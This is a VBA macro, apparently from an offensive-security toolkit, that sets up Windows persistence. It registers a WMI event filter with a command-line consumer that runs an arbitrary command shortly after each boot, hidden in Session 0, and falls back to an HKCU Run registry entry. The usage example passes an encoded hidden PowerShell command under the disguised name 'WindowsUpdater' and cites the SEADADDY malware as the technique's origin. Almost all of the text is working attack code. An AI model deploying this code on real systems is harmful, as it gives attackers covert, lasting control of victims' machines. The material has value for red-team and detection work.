'
' SYNOPSIS:
'   This macro implements two windows persistence methods:
'   - WMI Event Filter object creation 
'   - simple HKCU Registry Run value insertion. It has to be HKCU to make it work under Win10 x64
'
'   WMI Persistence method as originally presented by SEADADDY malware
'       (https://github.com/pan-unit42/iocs/blob/master/seaduke/decompiled.py#L887)
'   and further documented by Matt Graeber.
'
'   The scheduled command will be launched after roughly 3 minutes since system
'   gets up. Also, even if the command shall spawn a window - it will not be visible,
'   since the command will get invoked by WmiPrvSE.exe that's running in Session 0.
'
' USAGE:
'   WindowsPersistence("command to be launched", "taskName")
'
' EXAMPLE:
'   WindowsPersistence "powershell -noP -sta -w 1 -enc WwBSAGUAZgBdAC4AQQ[...]EUAWAA=", "WindowsUpdater"
'
' AUTHOR:
'   Mariusz Banach / mgeeky, '17
'

Public Function WMIPersistence(ByVal exePath As String, ByVal taskName As String) As Boolean
    Dim filterName, consumerName As String
    Dim objLocator, objService1
    Dim objInstances1, objInstances2, objInstances3
    Dim newObj1, newObj2, newObj3
    
    On Error GoTo Failed
    
    filterName = taskName & "Event"
    consumerName = taskName & "Consumer"
    
    Set objLocator = CreateObject("WbemScripting.SWbemLocator")
    Set objService1 = objLocator.ConnectServer(".", "root\subscription")
    
    '
    ' Step 1: Set WMI Instance of type Event Filter
    '
    Set objInstances1 = objService1.Get("__EventFilter")

    ' The malware originally will kicks in after roughly 3 minutes since System gets up.
    ' One can modify this delay time by modifying the WHERE clausule of the below query.
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 " _
    & "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' " _
    & "AND TargetInstance.SystemUpTime >= 200 AND " _
    & "TargetInstance.SystemUpTime < 320"
    
    ' New object of type __EventFilter
    Set newObj1 = objInstances1.Spawninstance_
    newObj1.Name = filterName
    newObj1.eventNamespace = "root\cimv2"
    newObj1.QueryLanguage = "WQL"
    newObj1.Query = Query
    newObj1.Put_
    
    '
    ' Step 2: Set WMI instance of type: CommandLineEventConsumer
    '
    Set objInstances2 = objService1.Get("CommandLineEventConsumer")
    Set newObj2 = objInstances2.Spawninstance_
    newObj2.Name = consumerName
    newObj2.CommandLineTemplate = exePath
    newObj2.Put_
    
    '
    ' Step 3: Set WMI instance of type: Filter To Consumer Binding
    '
    Set objInstances3 = objService1.Get("__FilterToConsumerBinding")
    Set newObj3 = objInstances3.Spawninstance_
    newObj3.Filter = "__EventFilter.Name=""" & filterName & """"
    newObj3.Consumer = "CommandLineEventConsumer.Name=""" & consumerName & """"
    newObj3.Put_
    
    WMIPersistence = True
    Exit Function
Failed:
    WMIPersistence = False
End Function

Public Function RegistryPersistence(ByVal exePath As String, ByVal taskName As String) As Boolean
    On Error GoTo Failed
        
    Const HKEY_CURRENT_USER = &H80000001
    strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Run"
    strComputer = "."
    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")
    strValueName = taskName
    strValue = exePath
    objReg.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue
    
    RegistryPersistence = True
    Exit Function
Failed:
    RegistryPersistence = False
End Function


Public Function WindowsPersistence(ByVal exePath As String, ByVal taskName As String) As Boolean
    If WMIPersistence(exePath, taskName) <> True Then
        RegistryPersistence exePath, taskName
    End If
End Function